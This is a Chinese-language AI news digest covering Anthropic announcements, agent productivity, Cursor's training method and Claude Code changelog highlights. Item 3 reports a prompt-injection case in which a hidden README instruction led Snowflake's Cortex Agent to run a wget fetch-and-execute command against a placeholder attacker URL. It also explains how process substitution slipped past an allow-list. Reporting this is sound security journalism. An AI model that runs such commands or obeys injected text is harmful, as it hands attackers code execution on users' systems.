## 今日要点

**1. Anthropic 收购 Vercept，全力押注 computer use 能力**

Anthropic 宣布收购 Vercept，明确目标是强化 Claude 的 computer use（电脑操控）能力。这是继 Claude 3.5 推出 computer use API 后，Anthropic 在 agent 与 GUI 自动化领域最实质性的战略动作，表明 AI 直接操控桌面和浏览器已成为下一阶段核心竞争场景。详见：https://www.anthropic.com/news/acquires-vercept

**2. Anthropic 发布 Responsible Scaling Policy 3.0，同时公开对抗 distillation attacks**

在同一周内，Anthropic 同时发布了 RSP v3.0 和针对 distillation attacks（模型蒸馏攻击）的检测与防御研究。前者是其 AI 安全承诺的重要升级，后者直接回应了竞争对手通过 API 调用大量蒸馏 Claude 能力的威胁——这两件事合在一起，代表 Anthropic 在「既要快速扩展、又要管控风险」的紧绷路线上进一步加码。详见：https://www.anthropic.com/news/responsible-scaling-policy-v3 / https://www.anthropic.com/news/detecting-and-preventing-distillation-attacks

**3. Snowflake Cortex AI 遭遇 prompt injection 成功执行恶意代码，沙箱信任边界再次告破**

PromptArmor 披露了一个已修复的真实攻击案例：攻击者在 GitHub README 底部藏入 prompt injection，诱导 Snowflake Cortex Agent 执行 `cat <(sh <(wget -q0- ATTACKER_URL/bugbot))`。该漏洞暴露出「allow-list 命令过滤」这一常见防护思路的根本缺陷——允许 `cat` 命令的同时没有防住 process substitution。这对所有正在构建 agent 工具的开发者都是直接的安全警示。详见：https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything

**4. The Pragmatic Engineer：AI agents 正在拖慢工程团队，而非加速**

这篇文章直接挑战了「AI agent 提升开发效率」的主流叙事。作者记录了大量工程团队使用 agent 后反而出现更多 bug、更多故障、更慢交付的现象，并追问根本原因。在 agent 工具铺天盖地的今天，这篇批判性分析尤其值得一读。详见：https://newsletter.pragmaticengineer.com/p/are-ai-agents-actually-slowing-us

**5. Cursor 发布「自总结训练法」突破长 context 训练瓶颈**

Cursor 团队在博客中披露了一项核心技术突破：通过让模型在训练过程中进行自我总结（self-summarization），可以从远超 max context window 的长轨迹中获取训练信号。这解决了 coding agent 在超长任务中「记忆衰减」的根本问题，是 agentic coding 领域少有的方法论级别创新。详见：https://cursor.com/blog/self-summarization

### Claude Code Changelog

Claude Code 近期连续发布了 v2.1.77、v2.1.78、v2.1.79 三个版本，更新量极大，以下提炼最值得关注的变化：

**v2.1.77** 是这三个版本中改动最深的一次。Claude Opus 4.6 默认最大输出 token 提升至 64k，上限扩展至 128k——这对长任务 agent 意义重大。同时修复了多个严重 bug，包括 PreToolUse hooks 绕过 `deny` 权限规则的安全漏洞、`--resume` 截断会话历史的数据丢失问题。性能方面，大型会话加载速度提升最高 45%，峰值内存节省 100-150MB。`/fork` 正式更名为 `/branch`。
https://github.com/anthropics/claude-code/blob/main/CHANGELOG.md#2177

**v2.1.78** 新增 `StopFailure` hook 事件（API 错误时触发），修复了企业用户遇到 429 限速时无法重试的问题，以及 `ANTHROPIC_BETAS` 环境变量在 Haiku 模型下被静默忽略的 bug。新增 `ANTHROPIC_CUSTOM_MODEL_OPTION` 支持自定义模型选项。
https://github.com/anthropics/claude-code/blob/main/CHANGELOG.md#2178

**v2.1.79** 新增 `--console` flag 支持 Anthropic Console 认证，修复了 `claude -p` 作为子进程时挂起的问题（对 Python 自动化脚本影响很大）。VSCode 插件新增 `/remote-control` 功能，可将本地 session 桥接到 claude.ai/code 在浏览器或手机上继续。
https://github.com/anthropics/claude-code/blob/main/CHANGELOG.md#2179
